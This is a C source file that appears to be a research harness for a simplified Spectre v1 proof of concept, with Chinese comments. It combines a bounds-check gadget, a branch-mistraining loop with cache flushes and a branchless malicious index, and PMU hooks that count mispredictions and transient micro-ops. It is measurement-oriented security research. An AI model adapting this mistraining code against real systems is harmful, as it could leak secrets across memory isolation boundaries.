/* Simplified Spectre PoC: Stage1 + Stage2 + UOPS measurement
 * 修改版：添加 vf_init + 训练轮打乱顺序，缓解硬件预取器影响
 */

#include <stdint.h>
#include <stdio.h>
#include <string.h>

#ifdef _MSC_VER
#include <intrin.h>
#pragma optimize("gt",on)
#else
#include <x86intrin.h>
#endif

#define NOP_REGION_BEGIN asm volatile("# NOP_REGION_BEGIN");
#define NOP_REGION_END   asm volatile("# NOP_REGION_END");

/********************************************************************
 Victim data
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];

/* ✅ 扩展 array1 到 256 字节 */
uint8_t array1[256] = {
    1,  2,  3,  4,  5,  6,  7,  8,
    9, 10, 11, 12, 13, 14, 15, 16
    /* 其余 240 字节初始化为 0 */
};

uint8_t unused2[64];
uint8_t array2[256 * 512];

char *secret = "Y";
uint8_t temp = 0;

/* ✅ 训练轮打乱顺序的索引表 */
static const int g_shuffled_training_idx[16] = {
    7, 13, 2, 9, 15, 4, 11, 0, 8, 5, 14, 1, 10, 3, 12, 6
};

/* PMU 接口 */
extern int      pmu_stage1_get_count(void);
extern uint64_t pmu_stage1_get_delta(int i);
extern int      pmu_stage2_get_count(void);
extern uint64_t pmu_stage2_get_delta(int i);

extern void     pmu_uops_snap_before(void);
extern void     pmu_uops_snap_after(void);
extern void     pmu_uops_print_results(void);
extern int      pmu_uops_get_count(void);
extern int32_t  pmu_uops_get_transient(int i);

/********************************************************************
 Stage 2: Gadget (victim function)
********************************************************************/
__attribute__((noinline))
void spectre_function(size_t x) {
  pmu_uops_snap_before();

  asm volatile(".globl STAGE1_BEGIN\nSTAGE1_BEGIN:");
  if (x < array1_size) {
    NOP_REGION_BEGIN
    temp &= array2[array1[x] * 512];
    NOP_REGION_END
  }
  asm volatile(".globl STAGE1_END\nSTAGE1_END:");

  pmu_uops_snap_after();
}

/********************************************************************
 Framework interfaces
********************************************************************/

volatile uint8_t *vf_get_probe_addr_for_secret(uint8_t s) {
    return &array2[(size_t)s * 512];
}

void vf_prepare_probe_region(int candidate_count) {
    if (candidate_count <= 0 || candidate_count > 256) {
        candidate_count = 256;
    }
    for (int i = 0; i < candidate_count; i++) {
        volatile uint8_t *p = vf_get_probe_addr_for_secret((uint8_t)i);
        *p = 1;
    }
}

/* ✅ 新增：一次性初始化函数（由驱动程序调用） */
__attribute__((used))
__attribute__((noinline))
void vf_init(void) {
    /* 1. 设置 array1[secret_value] = secret_value */
    uint8_t secret_value = (uint8_t)(*secret);
    array1[secret_value] = secret_value;
    
    /* 2. 触发 array2 的所有 page fault（预分配物理页） */
    for (int i = 0; i < (int)sizeof(array2); i++) {
        array2[i] = 1;
    }
    
    /* 3. 调试输出 */
    fprintf(stderr, "[vf_init] secret='%c' (0x%02x), array1[%u]=%u\n",
            secret_value, secret_value, secret_value, array1[secret_value]);
    fprintf(stderr, "[vf_init] array1 base: %p\n", (void*)array1);
    fprintf(stderr, "[vf_init] array2 base: %p\n", (void*)array2);
    fprintf(stderr, "[vf_init] array2 size: %zu bytes\n", sizeof(array2));
}

/********************************************************************
 Stage 1: Mistrain + Trigger
 ✅ 关键修改：训练轮使用打乱顺序，避免触发流式预取器
********************************************************************/
__attribute__((noinline))
void stage1_mistrain_trigger(size_t malicious_x) {
    int j;
    size_t training_x, x;

    for (j = 29; j >= 0; j--) {
        /* ✅ 使用打乱后的索引 */
        training_x = (size_t)g_shuffled_training_idx[j % 16];
        
        _mm_clflush(&array1_size);
        for (volatile int z = 0; z < 200; z++) {}

        x = ((j % 6) - 1) & ~0xFFFF;
        x = (x | (x >> 16));
        x = training_x ^ (x & (malicious_x ^ training_x));

        spectre_function(x);
    }
}

/* ✅ 修改：vf_run_attack_once 不再写入 array1 */
void vf_run_attack_once(void) {
    uint8_t secret_value = (uint8_t)(*secret);  // 89 ('Y')
    size_t malicious_x = (size_t)secret_value;  // 89
    stage1_mistrain_trigger(malicious_x);
}

/********************************************************************
 main (仅 standalone 测试时使用)
********************************************************************/
#ifndef STAGE2_TEST_MAIN
int main(int argc, const char **argv) {
    int i;

    vf_init();  // ✅ 在 main 开始时初始化

    uint8_t secret_value = (uint8_t)(*secret);
    size_t malicious_x = (size_t)secret_value;

    stage1_mistrain_trigger(malicious_x);

    {
        int n = pmu_stage1_get_count();
        for (i = 0; i < n; i++) {
            printf("STAGE1_DELTA_BR_MISP_COND[%d]=%llu\n",
                   i,
                   (unsigned long long)pmu_stage1_get_delta(i));
        }
    }

    pmu_uops_print_results();

    return 0;
}
#endif